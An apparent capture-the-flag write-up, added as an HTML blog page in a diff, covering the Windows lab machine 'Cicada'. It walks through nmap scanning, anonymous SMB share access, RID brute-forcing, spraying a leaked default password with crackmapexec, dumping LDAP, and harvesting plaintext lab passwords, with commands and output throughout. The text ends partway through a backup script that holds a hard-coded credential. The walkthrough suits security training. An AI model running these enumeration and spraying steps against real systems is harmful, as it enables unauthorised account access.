@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Windows - Easy - Cicada - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Windows - Easy - Cicada</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1732784178450"
+                  >2024-11-28 09:56</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1742156096605"
+                  >2025-03-16 21:14</time
+                ></span
+              >
+            </div>
+            
+            <div>
+              Keywords: 
+              <span class="keyword">sebackuppriv</span>
+              
+              <span class="keyword">smb</span>
+              
+              <span class="keyword">windows</span>
+              
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p>nmap tcp scan returns nothing.</p>
+<div><pre class="hljs"><code><span class="hljs-string">$sudo</span> <span class="hljs-string">nmap</span> <span class="hljs-string">-p-</span> <span class="hljs-string">-A</span> <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.149</span>
+<span class="hljs-string">Starting</span> <span class="hljs-string">Nmap</span> <span class="hljs-number">7.</span><span class="hljs-string">94SVN</span> <span class="hljs-string">(</span> <span class="hljs-string">https://nmap.org</span> <span class="hljs-string">)</span> <span class="hljs-string">at</span> <span class="hljs-number">2024-11-28 </span><span class="hljs-number">08</span><span class="hljs-string">:49</span> <span class="hljs-string">UTC</span>
+<span class="hljs-string">Nmap</span> <span class="hljs-string">scan</span> <span class="hljs-string">report</span> <span class="hljs-string">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.149</span>
+<span class="hljs-string">Host</span> <span class="hljs-string">is</span> <span class="hljs-string">up</span> <span class="hljs-string">(0.048s</span> <span class="hljs-string">latency).</span>
+<span class="hljs-attr">Not shown:</span> <span class="hljs-number">65522</span> <span class="hljs-string">filtered</span> <span class="hljs-string">tcp</span> <span class="hljs-string">ports</span> <span class="hljs-string">(no-response)</span>
+<span class="hljs-string">PORT</span>      <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span>       <span class="hljs-string">VERSION</span>
+<span class="hljs-number">53</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">domain</span>        <span class="hljs-string">Simple</span> <span class="hljs-string">DNS</span> <span class="hljs-string">Plus</span>
+<span class="hljs-number">88</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">kerberos-sec</span>  <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Kerberos</span> <span class="hljs-string">(server</span> <span class="hljs-attr">time:</span> <span class="hljs-number">2024-11-28 15:51:27Z</span><span class="hljs-string">)</span>
+<span class="hljs-number">135</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">139</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">netbios-ssn</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">netbios-ssn</span>
+<span class="hljs-number">389</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">cicada.htb0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-string">|_ssl-date:</span> <span class="hljs-string">TLS</span> <span class="hljs-string">randomness</span> <span class="hljs-string">does</span> <span class="hljs-string">not</span> <span class="hljs-string">represent</span> <span class="hljs-string">time</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ssl-cert: Subject:</span> <span class="hljs-string">commonName=CICADA-DC.cicada.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Subject Alternative Name: othername:</span> <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span><span class="hljs-string">::&lt;unsupported&gt;,</span> <span class="hljs-string">DNS:CICADA-DC.cicada.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Not valid before:</span> <span class="hljs-number">2024-08-22T20:24:16</span>
+<span class="hljs-string">|_Not</span> <span class="hljs-attr">valid after:</span>  <span class="hljs-number">2025-08-22T20:24:16</span>
+<span class="hljs-number">445</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">microsoft-ds?</span>
+<span class="hljs-number">464</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">kpasswd5?</span>
+<span class="hljs-number">593</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>    <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span>
+<span class="hljs-number">636</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ssl/ldap</span>      <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">cicada.htb0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-string">|_ssl-date:</span> <span class="hljs-string">TLS</span> <span class="hljs-string">randomness</span> <span class="hljs-string">does</span> <span class="hljs-string">not</span> <span class="hljs-string">represent</span> <span class="hljs-string">time</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ssl-cert: Subject:</span> <span class="hljs-string">commonName=CICADA-DC.cicada.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Subject Alternative Name: othername:</span> <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span><span class="hljs-string">::&lt;unsupported&gt;,</span> <span class="hljs-string">DNS:CICADA-DC.cicada.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Not valid before:</span> <span class="hljs-number">2024-08-22T20:24:16</span>
+<span class="hljs-string">|_Not</span> <span class="hljs-attr">valid after:</span>  <span class="hljs-number">2025-08-22T20:24:16</span>
+<span class="hljs-number">3268</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">cicada.htb0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-string">|_ssl-date:</span> <span class="hljs-string">TLS</span> <span class="hljs-string">randomness</span> <span class="hljs-string">does</span> <span class="hljs-string">not</span> <span class="hljs-string">represent</span> <span class="hljs-string">time</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ssl-cert: Subject:</span> <span class="hljs-string">commonName=CICADA-DC.cicada.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Subject Alternative Name: othername:</span> <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span><span class="hljs-string">::&lt;unsupported&gt;,</span> <span class="hljs-string">DNS:CICADA-DC.cicada.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Not valid before:</span> <span class="hljs-number">2024-08-22T20:24:16</span>
+<span class="hljs-string">|_Not</span> <span class="hljs-attr">valid after:</span>  <span class="hljs-number">2025-08-22T20:24:16</span>
+<span class="hljs-number">3269</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">ssl/ldap</span>      <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">cicada.htb0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-string">|_ssl-date:</span> <span class="hljs-string">TLS</span> <span class="hljs-string">randomness</span> <span class="hljs-string">does</span> <span class="hljs-string">not</span> <span class="hljs-string">represent</span> <span class="hljs-string">time</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ssl-cert: Subject:</span> <span class="hljs-string">commonName=CICADA-DC.cicada.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Subject Alternative Name: othername:</span> <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span><span class="hljs-string">::&lt;unsupported&gt;,</span> <span class="hljs-string">DNS:CICADA-DC.cicada.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Not valid before:</span> <span class="hljs-number">2024-08-22T20:24:16</span>
+<span class="hljs-string">|_Not</span> <span class="hljs-attr">valid after:</span>  <span class="hljs-number">2025-08-22T20:24:16</span>
+<span class="hljs-number">5985</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">http</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span>
+<span class="hljs-string">|_http-title:</span> <span class="hljs-string">Not</span> <span class="hljs-string">Found</span>
+<span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-HTTPAPI/2.0</span>
+<span class="hljs-number">60281</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-attr">Warning:</span> <span class="hljs-string">OSScan</span> <span class="hljs-string">results</span> <span class="hljs-string">may</span> <span class="hljs-string">be</span> <span class="hljs-string">unreliable</span> <span class="hljs-string">because</span> <span class="hljs-string">we</span> <span class="hljs-string">could</span> <span class="hljs-string">not</span> <span class="hljs-string">find</span> <span class="hljs-string">at</span> <span class="hljs-string">least</span> <span class="hljs-number">1</span> <span class="hljs-string">open</span> <span class="hljs-string">and</span> <span class="hljs-number">1</span> <span class="hljs-string">closed</span> <span class="hljs-string">port</span>
+<span class="hljs-attr">Device type:</span> <span class="hljs-string">general</span> <span class="hljs-string">purpose</span>
+<span class="hljs-string">Running</span> <span class="hljs-string">(JUST</span> <span class="hljs-string">GUESSING):</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-number">2022</span> <span class="hljs-string">(89%)</span>
+<span class="hljs-attr">Aggressive OS guesses:</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2022</span> <span class="hljs-string">(89%)</span>
+<span class="hljs-literal">No</span> <span class="hljs-string">exact</span> <span class="hljs-string">OS</span> <span class="hljs-string">matches</span> <span class="hljs-string">for</span> <span class="hljs-string">host</span> <span class="hljs-string">(test</span> <span class="hljs-string">conditions</span> <span class="hljs-string">non-ideal).</span>
+<span class="hljs-attr">Network Distance:</span> <span class="hljs-number">2</span> <span class="hljs-string">hops</span>
+<span class="hljs-attr">Service Info: Host:</span> <span class="hljs-string">CICADA-DC;</span> <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows</span>
+
+<span class="hljs-attr">Host script results:</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">smb2-security-mode:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">3:1:1:</span> 
+<span class="hljs-string">|_</span>    <span class="hljs-string">Message</span> <span class="hljs-string">signing</span> <span class="hljs-string">enabled</span> <span class="hljs-string">and</span> <span class="hljs-string">required</span>
+<span class="hljs-string">|_clock-skew:</span> <span class="hljs-string">6h59m58s</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">smb2-time:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">date:</span> <span class="hljs-number">2024-11-28T15:52:30</span>
+<span class="hljs-string">|_</span>  <span class="hljs-attr">start_date:</span> <span class="hljs-string">N/A</span>
+
+<span class="hljs-string">TRACEROUTE</span> <span class="hljs-string">(using</span> <span class="hljs-string">port</span> <span class="hljs-number">53</span><span class="hljs-string">/tcp)</span>
+<span class="hljs-string">HOP</span> <span class="hljs-string">RTT</span>      <span class="hljs-string">ADDRESS</span>
+<span class="hljs-number">1</span>   <span class="hljs-number">32.09</span> <span class="hljs-string">ms</span> <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.1</span>
+<span class="hljs-number">2</span>   <span class="hljs-number">64.41</span> <span class="hljs-string">ms</span> <span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.149</span></code></pre></div>
+<p>Starting with SMB, we can find two nonstandard discs, DEV and HR.</p>
+<p><img src="/_resources/32c180c8f58547689edae18df9081651.png" /></p>
+<p>We cannot log into DEV disc with anonymus, but we can into HR. In there we can find a greeting message from HR with some interesting content.</p>
+<div><pre class="hljs"><code>Dear <span class="hljs-built_in">new</span> hire!
+
+Welcome <span class="hljs-keyword">to</span> Cicada Corp! We<span class="hljs-comment">'re thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.</span>
+
+Your <span class="hljs-keyword">default</span> password <span class="hljs-built_in">is</span>: Cicada$M6Corpb*@Lp#nZp!<span class="hljs-number">8</span>
+
+<span class="hljs-keyword">To</span> change your password:
+
+<span class="hljs-number">1</span>. Log <span class="hljs-keyword">in</span> <span class="hljs-keyword">to</span> your Cicada Corp account** <span class="hljs-keyword">using</span> the provided username <span class="hljs-built_in">and</span> the <span class="hljs-keyword">default</span> password mentioned above.
+<span class="hljs-number">2</span>. Once logged <span class="hljs-keyword">in</span>, navigate <span class="hljs-keyword">to</span> your account settings <span class="hljs-built_in">or</span> profile settings section.
+<span class="hljs-number">3</span>. Look <span class="hljs-keyword">for</span> the <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> change your password. This will be labeled <span class="hljs-keyword">as</span> <span class="hljs-string">"Change Password"</span>.
+<span class="hljs-number">4</span>. Follow the prompts <span class="hljs-keyword">to</span> create a <span class="hljs-built_in">new</span> password**. Make sure your <span class="hljs-built_in">new</span> password <span class="hljs-built_in">is</span> strong, containing a mix <span class="hljs-keyword">of</span> uppercase letters, lowercase letters, numbers, <span class="hljs-built_in">and</span> special characters.
+<span class="hljs-number">5</span>. After changing your password, make sure <span class="hljs-keyword">to</span> save your changes.
+
+Remember, your password <span class="hljs-built_in">is</span> a crucial aspect <span class="hljs-keyword">of</span> keeping your account secure. Please <span class="hljs-keyword">do</span> <span class="hljs-built_in">not</span> share your password <span class="hljs-keyword">with</span> anyone, <span class="hljs-built_in">and</span> ensure you use a complex password.
+
+<span class="hljs-keyword">If</span> you encounter any issues <span class="hljs-built_in">or</span> need assistance <span class="hljs-keyword">with</span> changing your password, don<span class="hljs-comment">'t hesitate to reach out to our support team at support@cicada.htb.</span>
+
+Thank you <span class="hljs-keyword">for</span> your attention <span class="hljs-keyword">to</span> this matter, <span class="hljs-built_in">and</span> once again, welcome <span class="hljs-keyword">to</span> the Cicada Corp team!
+
+Best regards,
+Cicada Corp</code></pre></div>
+<p>We cannot enumerate users using rpcclient.</p>
+<div><pre class="hljs"><code><span class="hljs-variable">$rpcclient</span> -U <span class="hljs-string">""</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">126.15</span>
+Password <span class="hljs-keyword">for</span> [WORKGROUP\]:
+rpcclient <span class="hljs-variable">$&gt;</span> enumdomusers
+result was NT_STATUS_ACCESS_DENIED</code></pre></div>
+<p>The same is true for windapsearch.</p>
+<div><pre class="hljs"><code>$./windapsearch<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--dc-ip</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">126.15</span> -u <span class="hljs-string">""</span> -U
+<span class="hljs-selector-attr">[+]</span> No username provided. Will try anonymous bind.
+<span class="hljs-selector-attr">[+]</span> Using Domain Controller at: <span class="hljs-number">10.129</span>.<span class="hljs-number">126.15</span>
+<span class="hljs-selector-attr">[+]</span> Getting defaultNamingContext from Root DSE
+<span class="hljs-selector-attr">[+]</span>	Found: DC=cicada,DC=htb
+<span class="hljs-selector-attr">[+]</span> Attempting bind
+<span class="hljs-selector-attr">[+]</span>	...success! Binded as: 
+<span class="hljs-selector-attr">[+]</span>	 None
+
+<span class="hljs-selector-attr">[+]</span> Enumerating all AD users
+<span class="hljs-selector-attr">[!]</span> Error retrieving users
+<span class="hljs-selector-attr">[!]</span> {<span class="hljs-string">'msgtype'</span>: <span class="hljs-number">101</span>, <span class="hljs-string">'msgid'</span>: <span class="hljs-number">3</span>, <span class="hljs-string">'result'</span>: <span class="hljs-number">1</span>, <span class="hljs-string">'desc'</span>: <span class="hljs-string">'Operations error'</span>, <span class="hljs-string">'ctrls'</span>: <span class="hljs-selector-attr">[]</span>, <span class="hljs-string">'info'</span>: <span class="hljs-string">'000004DC: LdapErr: DSID-0C090C78, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c'</span>}</code></pre></div>
+<p>Running netexec finally got me something:</p>
+<div><pre class="hljs"><code>nxc smb <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span> -u guest -p <span class="hljs-string">''</span> --rid-brute
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        [*] Windows Server <span class="hljs-number">2022</span> Build <span class="hljs-number">20348</span> x64 (name:<span class="hljs-built_in">CICADA</span>-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        [+] cicada.htb\guest: 
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">498</span>: <span class="hljs-built_in">CICADA</span>\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">500</span>: <span class="hljs-built_in">CICADA</span>\Administrator (SidTypeUser)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">501</span>: <span class="hljs-built_in">CICADA</span>\Guest (SidTypeUser)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">502</span>: <span class="hljs-built_in">CICADA</span>\krbtgt (SidTypeUser)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">512</span>: <span class="hljs-built_in">CICADA</span>\Domain Admins (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">513</span>: <span class="hljs-built_in">CICADA</span>\Domain Users (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">514</span>: <span class="hljs-built_in">CICADA</span>\Domain Guests (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">515</span>: <span class="hljs-built_in">CICADA</span>\Domain Computers (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">516</span>: <span class="hljs-built_in">CICADA</span>\Domain Controllers (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">517</span>: <span class="hljs-built_in">CICADA</span>\Cert Publishers (SidTypeAlias)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">518</span>: <span class="hljs-built_in">CICADA</span>\Schema Admins (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">519</span>: <span class="hljs-built_in">CICADA</span>\Enterprise Admins (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">520</span>: <span class="hljs-built_in">CICADA</span>\Group Policy Creator Owners (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">521</span>: <span class="hljs-built_in">CICADA</span>\Read-only Domain Controllers (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">522</span>: <span class="hljs-built_in">CICADA</span>\Cloneable Domain Controllers (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">525</span>: <span class="hljs-built_in">CICADA</span>\Protected Users (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">526</span>: <span class="hljs-built_in">CICADA</span>\Key Admins (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">527</span>: <span class="hljs-built_in">CICADA</span>\Enterprise Key Admins (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">553</span>: <span class="hljs-built_in">CICADA</span>\RAS and IAS Servers (SidTypeAlias)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">571</span>: <span class="hljs-built_in">CICADA</span>\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">572</span>: <span class="hljs-built_in">CICADA</span>\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">1000</span>: <span class="hljs-built_in">CICADA</span>\<span class="hljs-built_in">CICADA</span>-DC$ (SidTypeUser)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">1101</span>: <span class="hljs-built_in">CICADA</span>\DnsAdmins (SidTypeAlias)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">1102</span>: <span class="hljs-built_in">CICADA</span>\DnsUpdateProxy (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">1103</span>: <span class="hljs-built_in">CICADA</span>\Groups (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">1104</span>: <span class="hljs-built_in">CICADA</span>\john.smoulder (SidTypeUser)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">1105</span>: <span class="hljs-built_in">CICADA</span>\sarah.dantelia (SidTypeUser)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">1106</span>: <span class="hljs-built_in">CICADA</span>\michael.wrightson (SidTypeUser)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">1108</span>: <span class="hljs-built_in">CICADA</span>\david.orelious (SidTypeUser)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">1109</span>: <span class="hljs-built_in">CICADA</span>\Dev Support (SidTypeGroup)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.126</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    <span class="hljs-built_in">CICADA</span>-DC        <span class="hljs-number">1601</span>: <span class="hljs-built_in">CICADA</span>\emily.oscars (SidTypeUser)</code></pre></div>
+<p>We can now look for a new worker in this company. I’ve created a file users.txt with the following contents:</p>
+<div><pre class="hljs"><code>Administrator
+Guest
+krbtgt
+john<span class="hljs-selector-class">.smoulder</span>
+sarah<span class="hljs-selector-class">.dantelia</span>
+michael<span class="hljs-selector-class">.wrightson</span>
+david<span class="hljs-selector-class">.orelious</span>
+emily.oscars</code></pre></div>
+<p>and then run <code>crackmapexec smb 10.129.126.15 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'</code>.</p>
+<p><img src="/_resources/df92ba82ffcd47c2b71c753a3cf405da.png" /></p>
+<p>Time to get in as <code>michael.wrightson</code>. Logging in to <code>/DEV</code> with smb didnt allow us to do anything either. Using this user we can dump all of the ldap with <code>ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.129.126.15 -o dump</code>. Looking for passwords within the dump with <code>cat ./* | grep password</code>, we can find "Just in case I forget my password is <code>aRt$Lp#7t*VQ!3</code>" in the description of user <code>david.orelious</code>. We finally get <code>/DEV</code>.</p>
+<p><img src="/_resources/09cb48a9da144ce48e5f05dc48a49f9a.png" /></p>
+<p>Contents of Backup_script.ps1:</p>
+<div><pre class="hljs"><code><span class="hljs-variable">$sourceDirectory</span> = <span class="hljs-string">"C:\smb"</span>
+<span class="hljs-variable">$destinationDirectory</span> = <span class="hljs-string">"D:\Backup"</span>
+
+<span class="hljs-variable">$username</span> = <span class="hljs-string">"emily.oscars"</span>
+<span class="hljs-variable">$password</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">"Q!3@Lp#M6b*7t*Vt"</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>
